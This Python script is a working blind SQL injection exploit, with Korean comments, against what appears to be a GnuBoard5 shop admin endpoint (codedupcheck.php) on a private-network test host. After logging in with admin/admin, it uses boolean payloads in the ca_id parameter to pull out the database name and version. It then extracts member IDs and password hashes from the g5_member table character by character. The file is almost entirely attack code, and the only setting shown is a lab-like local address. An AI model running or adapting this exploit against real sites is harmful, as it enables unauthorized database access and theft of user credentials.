import requests

def login(session, base_url, mb_id, mb_password):
    login_url = f"{base_url}/sir/bbs/login_check.php"
    login_data = {
        "url": "%2Fsir%2F",
        "mb_id": mb_id,
        "mb_password": mb_password
    }
    login_headers = {
        "Origin": base_url,
        "Referer": f"{base_url}/sir/",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "ko-KR,ko;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    res = session.post(login_url, headers=login_headers, data=login_data)
    return res


def access_main(session, base_url):
    main_url = f"{base_url}/sir/"
    headers = {
        "Referer": f"{base_url}/sir/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    res = session.get(main_url, headers=headers)
    return res


def exploit_sqli(session, base_url, it_id_val, ca_id_payload):
    sqli_url = f"{base_url}/sir/adm/shop_admin/codedupcheck.php"
    sqli_headers = {
        "Referer": f"{base_url}/sir/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    payload = {
        "it_id": it_id_val,
        "ca_id": ca_id_payload
    }

    res = session.post(sqli_url, headers=sqli_headers, data=payload)
    
    try:
        result = res.json()
        return result
    except Exception as e:
        return None


def leak_db_info():
    db_len = 0
    db_name = ""
    for i in range(1,11):
        db_len_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or length(database())={}#".format(i))
        if db_len_query is not None and db_len_query.get("name") == "test":
            db_len = i
            break
        else:
            continue
    
    for i in range(1, db_len+1):
        for j in range(33, 127):
            db_name_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or binary substr(database(), {}, 1)='{}'#".format(i, chr(j)))
            if db_name_query is not None and db_name_query.get("name") == "test":
                db_name += chr(j)
                break
            else:
                continue
    return db_name


def leak_db_version():
    db_version_len = 0
    db_version = ""
    for i in range(1,20):
        db_version_len_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or length(@@version)={}#".format(i))
        if db_version_len_query is not None and db_version_len_query.get("name") == "test":
            db_version_len = i
            break
        else:
            continue
    
    for i in range(1, db_version_len+1):
        for j in range(33, 127):
            db_version_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or binary substr(@@version, {}, 1)='{}'#".format(i, chr(j)))
            if db_version_query is not None and db_version_query.get("name") == "test":
                db_version += chr(j)
                break
            else:
                continue
    return db_version


def leak_table_data():
    tb_name = "g5_member"
    record_cnt = 0
    data_id_len_list = []
    data_pw_len_list = []
    data = {}
    id_data = ""
    pw_data = ""
    
    for i in range(1, 10):
        record_cnt_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or (select count(*) from {}) = {}#".format(tb_name, i))
        if record_cnt_query is not None and record_cnt_query.get("name") == "test":
            record_cnt = i
            break
        
    # mb_id 받아오기
    for i in range(record_cnt+1):
        for j in range(1, 10):
            data_id_len_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or (select length(mb_id) from {} limit {}, 1) = {}#".format(tb_name, i, j))
            if data_id_len_query is not None and data_id_len_query.get("name") == "test":
                data_id_len_list.append(j)
                break
    for i in range(record_cnt):
        for j in range(1, data_id_len_list[i]+1):
            for k in range(33, 127):
                data_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or binary substr((select mb_id from {} limit {}, 1), {}, 1) = '{}'#".format(tb_name, i, j, chr(k)))
                if data_query is not None and data_query.get("name") == "test":
                    id_data += chr(k)
                    break
                
    # mb_password 받아오기
    for i in range(record_cnt+1):
        for j in range(1, 100):
            data_pw_len_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or (select length(mb_password) from {} limit {}, 1) = {}#".format(tb_name, i, j))
            if data_pw_len_query is not None and data_pw_len_query.get("name") == "test":
                data_pw_len_list.append(j)
                break
    for i in range(record_cnt):
        for j in range(1, data_pw_len_list[i]+1):
            for k in range(33, 127):
                data_query = exploit_sqli(session, base_url, it_id_val="", ca_id_payload="' or binary substr((select mb_password from {} limit {}, 1), {}, 1) = '{}'#".format(tb_name, i, j, chr(k)))
                if data_query is not None and data_query.get("name") == "test":
                    pw_data += chr(k)
                    break
    data[id_data] = pw_data
    return data


if __name__ == "__main__":
    base_url = "http://192.168.55.168"
    session = requests.Session()

    # 로그인 시도
    login_res = login(session, base_url, mb_id="admin", mb_password="admin")

    # 메인 페이지 접근
    main_res = access_main(session, base_url)
    
    # DB 정보 추출
    db_name = leak_db_info()
    print("db 이름 : {}".format(db_name))
    
    # DB 버전 정보 추출
    db_version = leak_db_version()
    print("db 버전 : {}".format(db_version))
    
    # 테이블 데이터 추출
    data = leak_table_data()
    print("계정 정보 leak : ", data)
    
